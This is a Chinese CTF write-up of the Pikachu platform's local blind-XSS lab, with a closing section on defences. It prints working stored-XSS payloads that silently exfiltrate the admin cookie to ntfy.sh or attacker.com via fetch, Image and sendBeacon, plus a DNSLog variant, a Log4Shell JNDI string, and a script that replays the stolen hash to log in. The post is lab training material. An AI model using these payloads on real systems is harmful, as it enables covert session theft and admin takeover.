---
layout: post
title: Pikachu - XSS盲打 Writeup（含带外外带三种方式对比）
platform: pikachu
date: 2026-10-27 21:24:00 +0800
categories: CTF
---

Pikachu - XSS盲打 Writeup（含带外外带三种方式对比）

一、题目信息

- 平台：Pikachu 漏洞练习平台（本地搭建）
- 模块：Cross-Site Scripting → xss之盲打
- 前台：`http://localhost/pikachu/vul/xss/xssblind/xss_blind.php`
- 后台：`http://localhost/pikachu/vul/xss/xssblind/admin_login.php` → `admin.php`
- 题型：Web
- 考点：**盲打 XSS（Blind XSS）**、带外（Out-of-Band）外带技术

**环境信息**：

```text
phpStudy 8.1.1.3（D:\phpstudy_pro）
Apache 2.4.39 + MySQL 5.7.26 + PHP 7.3.4
pikachu 源码放在 D:\phpstudy_pro\WWW\pikachu\
```

**结构：两个页面，一前一后**

```text
┌──────────────────────────────┐        ┌──────────────────────────────┐
│ ① 前台 xss_blind.php          │        │ ② 后台 admin.php              │
│    任何人都能访问               │  存储   │    需要登录                    │
│                              │ ────→  │                              │
│  输入"看法" + "你的大名"        │  数据库  │  管理员看到"意见列表"表格       │
│  → 显示"谢谢参与..."           │        │  → ★ payload 在这里执行        │
│  ★ 攻击者看不到任何结果          │        │                              │
└──────────────────────────────┘        └──────────────────────────────┘
```

**后台账号**（`users` 表）：

```text
admin   / 123456
pikachu / 000000
test    / abc123
```

**✅ 实测结果（三种外带方式对比）**

```text
三次提交都存在 xssblind 表里：

  id  7 | 丑
  id  8 | <script>alert(document.cookie)</script>
  id  9 | <script>new Image().src='https://ntfy.sh/你的随机topic/?c='+document.cookie</script>
  id 10 | <script>fetch('https://ntfy.sh/cecilia-bl1nd-x7k2q',
                       {method:'POST',body:document.cookie,mode:'no-cors'})</script>

结果：

  id 8  → ⚠️ 弹窗了，但管理员会看到 → 主动暴露
  id 9  → ❌ 失败（topic 名是中文 + GET 不会被 ntfy 记录）
  id 10 → ✅ 静默成功
```

**ntfy.sh 收到的消息**：

```text
1. hello-from-test                              ← 测通道
2. TEST_POST_METHOD                             ← 测 POST
3. ant[uname]=admin; ant[pw]=10470c3b4b1fed12c3baac014be15fac67c6e815;
   PHPSESSID=h21jhq7u3kjrbu7gs6ih0jfvp5          ← ★ payload 外带的真实 cookie
4. ant[uname]=admin; ant[pw]=10470c3b...        ← 再刷新后台，又来一条
5. ...
```

**关键：管理员页面上【什么都没有发生】—— 无弹窗、无跳转、无异常。**

二、题目分析

**① 前台代码：存进去，但你看不到**

```php
<?php
// xss_blind.php 第 25-36 行
if(array_key_exists("content", $_POST) && $_POST['content'] != null){
    $content = escape($link, $_POST['content']);      // SQL 转义
    $name    = escape($link, $_POST['name']);         // SQL 转义
    $time    = date('Y-m-d g:i:s');

    $query = "insert into xssblind(time,content,name) values('$time','$content','$name')";
    $result = execute($link, $query);

    if(mysqli_affected_rows($link) == 1){
        $html .= "<p>谢谢参与，阁下的看法我们已经收到!</p>";   // ★ 只回显这一句
    }
}
?>
```

**★ 前台只告诉"收到了"，不显示任何留言内容 —— 这就是"盲"的第一层。**

**表单结构**：

```html
<form method="post">
    <textarea name="content"></textarea>                              <!-- 看法 -->
    <input type="text" name="name"/>                                  <!-- 你的大名 -->
    <input type="submit" name="submit" value="提交" />
</form>
```

**★ 两个字段都会被存库 → 两个注入点。**

**② 后台代码：这里才是执行的地方**

```php
<?php
// admin.php 第 24-28 行
$is_login_id = check_xss_login($link);       // 检查 ant[uname] / ant[pw] cookie
if(!$is_login_id){
    header("location:admin_login.php");
}
?>
```

```php
<?php
// admin.php 第 82-95 行
$query = "select * from xssblind";
$result = mysqli_query($link, $query);
while($data = mysqli_fetch_assoc($result)){
    $html = <<<A
    <tr>
        <td>{$data['id']}</td>
        <td>{$data['time']}</td>
        <td>{$data['content']}</td>      <!-- ★ 内容原样输出 -->
        <td>{$data['name']}</td>         <!-- ★ 姓名原样输出 -->
        <td><a href="admin.php?id={$data['id']}">删除</a></td>
    </tr>
A;
    echo $html;
}
?>
```

**★ 两个字段都直接输出，无任何转义。**

**③ "盲"到底盲在哪**

```
攻击者的视野：

    提交 payload  →  看到"谢谢参与，阁下的看法我们已经收到!"
                 ↓
              ???（什么也不知道）
                 ↓
    管理员什么时候登录？会不会看后台？payload 执行了吗？
    
★ 全都不知道
★ 所以叫"盲打"（Blind XSS）
```

**★ 对比：**

| | 反射型 / 存储型 | **盲打** |
|---|---|---|
| 你提交后能看到效果吗 | ✅ 立刻看到 | ❌ **完全看不到** |
| 怎么确认成功 | 直接看 | ✅ **必须带外（OOB）** |
| 受害者 | 自己 / 所有访问者 | **后台管理员** |

**④ 为什么盲打的危害最高**

```
受害者是【管理员】，不是普通用户：

    能读管理员的 cookie（ant[uname] + ant[pw]）
        ↓
    能用这些 cookie 免密登录后台（Pass-the-Hash）
        ↓
    能做管理员能做的一切：
        · 看所有用户留言（隐私）
        · 删除数据
        · 如果有更多后台功能：改配置、加账号、导出数据
        ↓
★ 从"一个匿名留言框" → "整个后台沦陷"
```

**⑤ 作者把答案写在提示里了**

**前台提示**：

```html
data-content="登录后台,看会发生啥?后台登录地址是/xssblind/admin_login.php"
```

**后台提示**：

```html
data-content="被弹了吗?"
```

**★ 作者直接告诉你了：去后台看会不会弹。**

**★ 但在真实场景里，你没有后台账号 —— 所以才需要"带外"。**

三、解题步骤

**第 1 步：前台提交一个验证性 payload**

**打开**：

```text
http://localhost/pikachu/vul/xss/xssblind/xss_blind.php
```

**"看法"填**：

```html
<script>alert(document.cookie)</script>
```

**"你的大名"填**：`admin`

**点提交**

**结果**：

```
谢谢参与，阁下的看法我们已经收到!

★ 没有弹窗、没有回显内容 —— 完全看不到效果
```

**第 2 步：登录后台**

**打开**：

```text
http://localhost/pikachu/vul/xss/xssblind/admin_login.php
```

**用 `admin` / `123456` 登录**

**第 3 步：后台页面加载 → payload 执行**

**登录后自动跳到 `admin.php`**：

```
用户反馈的意见列表：

┌────┬─────────────────────┬──────────────────────────┬────────┐
│编号 │ 时间                │ 内容                      │ 姓名   │
├────┼─────────────────────┼──────────────────────────┼────────┤
│ 7  │ 2026-10-27 08:26:22 │ 丑                       │ admin  │
│ 8  │ 2026-10-27 08:33:34 │                          │ admin  │  ← 内容空白
└────┴─────────────────────┴──────────────────────────┴────────┘
```

**同时弹窗**：

```
ant[uname]=admin;
ant[pw]=10470c3b4b1fed12c3baac014be15fac67c6e815;
PHPSESSID=h21jhq7u3kjrbu7gs6ih0jfvp5
```

**★ 注意 id 8 那行的"内容"列是**空的**：**

```html
<td><script>alert(...)</script></td>
```

```
★ <script> 不产生任何可见文本，只执行
★ 所以管理员看到的是一条"空留言"
★ 一条空留言就把自己卖了
```

**第 4 步：⚠️ 发现问题 —— 弹窗会暴露**

**思考**：

```
如果这是真实攻击：
    管理员打开后台 → 突然弹窗 → 警觉 → 查代码 → 删留言 → 修复
    → 攻击失败，还打草惊蛇

★ 弹窗 = 自杀式攻击
★ 真实盲打必须"静默"
```

**第 5 步：⭐ 改用"带外"（Out-of-Band）方式**

**核心思路**：

```
payload 不弹窗
而是悄悄发一个请求到【攻击者自己的服务器】
→ 服务器记日志 → 攻击者去查日志 → 知道"HIT 了"
```

**需要一个"接收端"。本地做实验最方便的是免费的 ntfy.sh**：

```
· 不用注册
· 一个 URL 就是一条通道
· 支持 POST 发布、GET 拉取
```

**第 6 步：⚠️ 踩坑 —— `new Image()` 失败**

**第一次尝试**（当时以为 img 是最简单的方式）：

```html
<script>new Image().src='https://ntfy.sh/你的随机topic/?c='+document.cookie</script>
```

**结果**：❌ 失败，ntfy 上什么都没有。

**两个原因叠加**：

**原因 1：topic 名是占位符**

```
https://ntfy.sh/你的随机topic/...
                └─────┬─────┘
              中文，ntfy 不接受（只允许字母数字 - _）

访问返回：{"code":40401,"http":404,"error":"page not found"}
```

**原因 2（更隐蔽）：GET 请求不会被记录**

**实测对比**：

```python
# 测试 A：GET 带 query（new Image 的方式）
GET https://ntfy.sh/cecilia-bl1nd-x7k2q/?c=TEST_IMAGE_METHOD
→ HTTP 404
→ 消息列表里【没有】出现        ❌

# 测试 B：POST body
POST https://ntfy.sh/cecilia-bl1nd-x7k2q
body: TEST_POST_METHOD
→ HTTP 200
→ 消息列表里【出现了】          ✅
```

**★ 原因**：

```
ntfy.sh 的 API 设计：
    POST /topic      ← 发布消息（body 就是内容）
    GET  /topic      ← 订阅（长连接推送）
    GET  /topic/json?poll=1  ← 拉取历史

★ GET 带 query 参数 → ntfy 不认识 → 404
★ 所以必须用 POST
```

**★ 这个坑很典型**：很多人做 XSS 外带只会 `<img>` / `new Image()`，但**目标只认 POST 就失效了**。

**第 7 步：✅ 用 `fetch` + `mode:'no-cors'` 解决**

**payload**：

```html
<script>fetch('https://ntfy.sh/cecilia-bl1nd-x7k2q',{method:'POST',body:document.cookie,mode:'no-cors'})</script>
```

**三个关键点**：

```text
① method:'POST'    → 满足 ntfy 的发布要求
② body:cookie      → 消息内容就是 cookie
③ mode:'no-cors'   → ★ 绕过 CORS
                      跨域请求默认会被浏览器拦（读不到响应）
                      但 no-cors 模式下"请求照发"，只是"响应读不到"
                      我们只需要"发出去"，不需要读响应
```

**第 8 步：验证 —— 管理员无感知，攻击者收到**

**操作**：

```text
① 前台提交上面那个 fetch payload
② 刷新后台 admin.php
③ 页面上【什么都不发生】（无弹窗）
④ 打开 https://ntfy.sh/cecilia-bl1nd-x7k2q/json?poll=1
```

**ntfy 输出**：

```json
{"event":"message","message":"hello-from-test",...}
{"event":"message","message":"TEST_POST_METHOD",...}
{"event":"message","message":"ant[uname]=admin; ant[pw]=10470c3b4b1fed12c3baac014be15fac67c6e815; PHPSESSID=h21jhq7u3kjrbu7gs6ih0jfvp5",...}
```

**★ 每刷新一次后台，就多一条 —— 因为 payload 每次都会执行。**

**★ 完整闭环**：

```
① 前台投毒（看不到结果）
        ↓
② 存进 xssblind 表
        ↓
③ 管理员登录后台，打开 admin.php
        ↓
④ 表格渲染 → fetch 静默执行
        ↓
⑤ POST 到 ntfy.sh，body 是管理员的 cookie
        ↓
⑥ 攻击者打开 ntfy → 看到 cookie
        ↓
★ 管理员：毫无察觉
★ 攻击者：证据在手
```

**第 9 步：验证偷到的是什么**

**被偷的 `ant[pw]` 是密码哈希**：

```python
import hashlib
pw = "123456"
md5 = hashlib.md5(pw.encode()).hexdigest()
sha1_of_md5 = hashlib.sha1(md5.encode()).hexdigest()

print("明文密码       :", pw)          # 123456
print("md5(密码)      :", md5)         # e10adc3949ba59abbe56e057f20f883e
print("sha1(md5(密码)):", sha1_of_md5) # 10470c3b4b1fed12c3baac014be15fac67c6e815
```

**★ 和页面泄露的值完全一致。**

**★ 拿到 `ant[uname]=admin` + `ant[pw]=10470c3b...` 就能免密登录后台**：

```python
import urllib.request
TARGET = "http://localhost/pikachu/vul/xss/xssblind/admin.php"
req = urllib.request.Request(TARGET, headers={
    "User-Agent": "Mozilla/5.0",
    "Cookie": "ant[uname]=admin; ant[pw]=10470c3b4b1fed12c3baac014be15fac67c6e815",
})
with urllib.request.urlopen(req) as r:
    body = r.read().decode("utf-8", "replace")
print("登录成功:", "你已经成功登录留言板后台" in body)
```

**★ 不用密码、不用登录取证 —— 直接是管理员。**

**第 10 步：清理测试数据**

**后台每条右侧有"删除"链接**（`admin.php?id=xxx`）。

**或者直接清库**：

```powershell
D:\phpstudy_pro\Extensions\MySQL5.7.26\bin\mysql.exe --host=127.0.0.1 --user=root --password=root `
  -e "use pikachu; delete from xssblind;"
```

四、延伸知识

**① 三种外带方式对比（本题实测）**

| 方式 | payload | 能发 POST 吗 | 隐蔽性 | ntfy 能收到吗 |
|---|---|---|---|---|
| `alert()` | `alert(document.cookie)` | — | ❌ **极差**（弹窗）| — |
| `<img>` / `new Image()` | `new Image().src='...?c='+x` | ❌ 只能 GET | ✅ 好 | ❌ **无效**（404）|
| `<form>` 自动提交 | `<form method=POST>...` | ✅ | ⚠️ 中（要 JS）| ✅ 有效 |
| **`fetch` + no-cors** | `fetch(url,{method:'POST',body:x,mode:'no-cors'})` | ✅ | ✅ **好** | ✅ **有效** |
| `XMLHttpRequest` | `xhr.open('POST',...); xhr.send(x)` | ✅ | ✅ 好 | ✅ 有效 |
| `navigator.sendBeacon` | `sendBeacon(url, data)` | ✅ | ✅ **最好**（页面卸载也能发）| ✅ 有效 |

**★ `navigator.sendBeacon` 是最隐蔽的**：

```javascript
navigator.sendBeacon('https://attacker.com/', document.cookie)
```

```
优点：
    · 异步发送，不阻塞页面
    · 页面关闭/跳转时也能完成发送
    · 不受 CORS 限制（同 no-cors）
    · 不会在控制台报错
```

**② 为什么必须带外（OOB）**

```
盲打的本质：攻击者看不到结果

三种"确认"思路：

① 带外请求（OOB）← 最常用
    payload 发请求到自己的服务器
    看服务器日志
   
② 侧信道
    payload 改变页面状态（比如把某个元素改红）
    然后想办法"看到"这个状态（需要别的漏洞配合）
    
③ DNS 查询（DNSLog）
    payload 触发一个 DNS 解析（比如 <img src="http://随机子域.dnslog.cn">）
    在 dnslog 平台看有没有解析记录
    ★ 好处：即使出站 HTTP 被封，DNS 通常还能出去
```

**③ 常用带外平台**

| 平台 | 用途 | 说明 |
|---|---|---|
| **dnslog.cn** | DNS 带外 | 免费，看 DNS 解析记录 |
| **ceye.io** | DNS + HTTP | 免费版够用 |
| **ntfy.sh** | HTTP 通知 | 免费、免注册、支持 POST/GET |
| **webhook.site** | HTTP 捕获 | 能看完整请求（头、体）|
| 自己的 VPS | 全部 | 最灵活，能写脚本处理 |

**★ 真实渗透中，dnslog + webhook 是最常用的组合。**

**④ 盲打 XSS 的真实场景**

**场景 1：后台管理系统的反馈/投诉功能**

```
攻击者：在"意见反馈"里提交 payload
管理员：在后台看到反馈 → payload 执行 → 管理员 cookie 泄露
```

**场景 2：工单系统**

```
攻击者：提交工单，内容里带 payload
客服/管理员：打开工单 → 中招
```

**场景 3：日志系统（Log4j 2 的经典）**

```
攻击者：在 User-Agent 里放 ${jndi:ldap://...}
系统：把 UA 写进日志
管理员：用工具查看日志 → 触发 JNDI 注入 → RCE

★ Log4Shell（CVE-2021-44228）就是这个模式
★ XSS 盲打的"表亲"—— 一个在浏览器里执行，一个在服务器上执行
```

**场景 4：审计后台**

```
攻击者：注册时把用户名设成 payload
管理员：在用户列表里看到 → 中招
★ 这就是"存储型 XSS 打管理员"的经典套路
```

**⑤ 为什么 `name` 字段也是注入点**

**本题有两个输入点**：

```html
<textarea name="content"></textarea>   ← "看法"
<input name="name" type="text"/>       ← "你的大名"
```

**两个都会在后台原样输出**：

```php
<td>{$data['content']}</td>
<td>{$data['name']}</td>
```

**★ 真实攻击中，攻击者会把 payload 藏在 `name` 里**：

```
理由：
    · 管理员通常只检查"内容"字段
    · "姓名"字段容易被忽略
    · 而且姓名可能出现在多个地方（列表、详情、导出）
    
★ 这叫"多点投毒"，提高命中率
```

**⑥ 防御盲打 XSS**

**根本上还是"输出转义"**：

```php
// 后台输出时转义
$safe_content = htmlspecialchars($data['content'], ENT_QUOTES | ENT_HTML5, 'UTF-8');
$safe_name    = htmlspecialchars($data['name'], ENT_QUOTES | ENT_HTML5, 'UTF-8');
echo "<td>{$safe_content}</td><td>{$safe_name}</td>";
```

**但盲打还暴露了另一个问题：后台的管理界面本身要有防护**

```text
① 输出转义（最基本）
② CSP（内容安全策略）
   → 即使注入了 <script>，浏览器也拒绝执行
③ 后台 cookie 加 HttpOnly
   → XSS 读不到 ant[pw]
④ 后台操作要求二次验证（敏感操作输密码）
⑤ 后台用独立的域名（隔离 cookie 作用域）
```

**★ 第 ③ 和第 ⑤ 条特别重要**：

```
本关的 cookie 是 setcookie('ant[pw]', ...) 没加 HttpOnly
→ XSS 能直接读
→ 如果加了 HttpOnly，XSS 还在，但偷不到凭证

★ 后台放在 admin.example.com
→ 即使前台有 XSS，也读不到 admin 域的 cookie
→ cookie 按域名隔离
```

**⑦ 一个容易被忽略的细节：空留言**

**管理员看到的表格**：

```
┌────┬─────────────────────┬──────────┬────────┐
│编号 │ 时间                │ 内容      │ 姓名   │
├────┼─────────────────────┼──────────┼────────┤
│ 7  │ 2026-10-27 08:26:22 │ 丑       │ admin  │
│ 10 │ 2026-10-27 08:44:57 │          │ admin  │  ← 空白
└────┴─────────────────────┴──────────┴────────┘
```

**★ "内容"列是空的，因为 `<script>` 不产生可见文本。**

**★ 这个"空留言"就是最强的隐蔽性**：

```
管理员：咦，有人提交了个空的？
    → 可能以为是误操作
    → 不会深究
    → 而他的 cookie 已经被发走了
```

**★ 真实盲打 payload 往往故意"看起来什么都没提交"，降低被发现的概率。**

五、总结

- **本题核心：前台存留言 → 后台渲染时执行 → 攻击者看不到结果（盲）→ 必须用带外确认。**

- **两条关键代码**：

```php
// 前台：存进去（SQL 转义了，但没 HTML 转义）
$content = escape($link, $_POST['content']);
$query = "insert into xssblind(time,content,name) values('$time','$content','$name')";

// 后台：原样输出（这里才执行）
<td>{$data['content']}</td>
<td>{$data['name']}</td>
```

- **⭐ 五个必记要点**：

```text
① 盲打 = 存储型 XSS 打管理员
   → 受害者权限最高
   → 攻击者看不到结果 → 必须带外

② 三种外带方式（实测对比）
   alert()          → 弹窗，暴露自己
   new Image()      → 只能 GET，很多接收端不认
   fetch(POST,no-cors) → 静默 + 可靠 ← 推荐

③ ntfy.sh 的 GET vs POST（踩过的坑）
   GET  /topic/?c=x  → 404，不会记录
   POST /topic body  → 200，记录 ✅

④ xssblind 的 content 和 name 都是注入点
   → 管理员常只检查"内容"，"姓名"容易被忽略

⑤ cookie 泄露的后果
   ant[pw] = sha1(md5(密码)) → Pass-the-Hash
   → 免密登录后台，永久有效（只要不改密码）
```

- **实测数据**：

```text
id 8  alert(document.cookie)     → 弹窗，暴露
id 9  new Image().src='...?c='   → ❌ 404（中文 topic + GET 不记录）
id 10 fetch(POST, no-cors)       → ✅ ntfy 收到真实 cookie

ntfy 消息：
  hello-from-test
  TEST_POST_METHOD
  ant[uname]=admin; ant[pw]=10470c3b...; PHPSESSID=h21jhq7u...
  ★ 每刷新一次后台，多一条
```

- **XSS 模块进度**：

```text
✅ 反射型xss(get)      —— 直接拼接，需绕 maxlength
✅ 反射型xss(post)     —— 需登录 + 自动提交表单 + Pass-the-Hash
✅ 存储型xss           —— SQL 转义≠HTML 转义
✅ DOM型xss            —— 源=input（Self-XSS）
✅ DOM型xss-x          —— 源=URL（真可利用）
✅ xss之盲打           —— 本题：打管理员 + 带外确认
⬜ xss之过滤           —— 绕过过滤
⬜ xss之htmlspecialchars —— 防护演示
⬜ xss之href输出        —— 属性上下文
⬜ xss之js输出          —— JS 上下文
```

**手工复现要点**：

```text
· 前台提交 <script>alert(document.cookie)</script> → 只显示"谢谢参与"
· 登录 admin_login.php（admin/123456）
· 打开 admin.php → 弹窗（payload 执行）
· 换 fetch(POST, no-cors) payload → 刷新后台 → 无弹窗但 ntfy 收到
· ntfy 用 GET ?poll=1 拉取，用 POST 发布
· 后台表格里 payload 那格是空白（<script> 无可见文本）
```

**一句话记忆**：

```
┌────────────────────────────────────────────────────────────┐
│  盲打 = 你的 payload 在管理员的后台里执行                      │
│                                                            │
│  你看不到 → 必须带外（OOB）确认                               │
│  弹窗会暴露 → 用 fetch POST + no-cors 静默外带                │
│  受害者是管理员 → 一次成功 = 后台沦陷                          │
│                                                            │
│  ★ 前台"谢谢参与"四个字背后，可能已经有人拿到你的后台权限        │
└────────────────────────────────────────────────────────────┘
```
